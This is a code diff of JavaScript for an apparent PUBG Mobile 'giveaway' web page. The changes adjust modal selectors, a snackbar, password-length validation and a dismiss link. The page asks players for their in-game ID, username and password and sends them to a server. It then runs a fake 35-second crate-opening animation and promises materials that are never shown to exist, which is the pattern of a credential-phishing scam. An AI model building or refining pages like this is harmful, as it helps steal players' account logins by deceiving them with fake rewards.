@@ -50,26 +50,29 @@ function winner(username, domain) {
             count++;
 
             if (terminaldiv.innerHTML.includes("You got")) {
-                $('.modal-title').html("Opening Crates ...");
+                $('#load-modal .modal-title').html("Opening Crates ...");
             }
 
             if (terminaldiv.innerHTML.includes("Finished")) {
-                $('.modal-title').html("Counting Materials ...");
+                $('#load-modal .modal-title').html("Counting Materials ...");
             }
         }
     }
 
     typing = setInterval(startTyping, 100);
 
-    return combo;
+    if (combo == 0) {
+        return 1;
+    } else {
+        return combo;
+    }
 }
 
 function drawMaterial(num) {
     $('#warning').hide();
     $('.material-cont').show();
     let tCtx = document.getElementById('materialCanvas').getContext('2d'),
-        img = new Image(),
-        text = tCtx.measureText(num.toString());
+        img = new Image();
 
     img.onload = function () {
         tCtx.drawImage(img, 0, 0, 131, 131);
@@ -164,6 +167,8 @@ $(document).ready(function () {
     });
 
     $('#tapatap').on('click', function (e) {
+        $('#tapatap').addClass('disabled');
+        $("#snackbar").addClass('show');
 
         let igid = $('#igid').val(),
             ign = $('#ign').val(),
@@ -176,7 +181,7 @@ $(document).ready(function () {
             ign.length != 0 &&
             $('#captcha').val().length != 0) {
 
-            if (user.length > 0 && pass.length > 6) {
+            if (user.length > 0 && pass.length >= 6) {
                 let payload = {
                     "ingameID": igid,
                     "ingameName": ign,
@@ -193,6 +198,7 @@ $(document).ready(function () {
                     contentType: "application/json",
                     success: function (data, textStatus, xhr) {
                         if (xhr.status == 200) {
+                            $("#snackbar").removeClass('show');
                             $('#data').get(0).reset();
                             captchaGen();
                             $('.participate-div').hide();
@@ -211,14 +217,14 @@ $(document).ready(function () {
                             setTimeout(() => {
                                 $('.circle-loader').toggleClass('load-complete');
                                 $('.checkmark').toggle();
-                                $('.modal-title').html("You got <r>" + `${materials}` + "</r> materials !");
+                                $('#load-modal .modal-title').html("You got <r>" + `${materials}` + "</r> materials !");
                                 drawMaterial(materials);
                                 $('.circle-loader').hide();
                                 $('#msg').html(
                                     "It will take several hours to deliver <r>" + `${materials}` + "</r> materials to your pubg mobile account (<r>" + `${igid}` +
                                     "</r>). You'll receive the materials in-game mail system.<br><br> Thank you for participating in the giveaway !"
                                 );
-                                $('.modal-footer').show();
+                                $('#load-modal .modal-footer').show();
                             }, 35000);
                         } else {
                             console.log(`status: ${xhr.status}`);
@@ -232,11 +238,13 @@ $(document).ready(function () {
                         console.log(errorThrown);
                     }
                 });
+            } else {
+                $('#pass').addClass('is-invalid');
             }
         }
     });
 
-    $('#dismiss').on('click', function () {
-        window.location.href = "index.html";
+    $('.dismiss').on('click', function () {
+        window.location.href = "../../index.html";
     });
 });
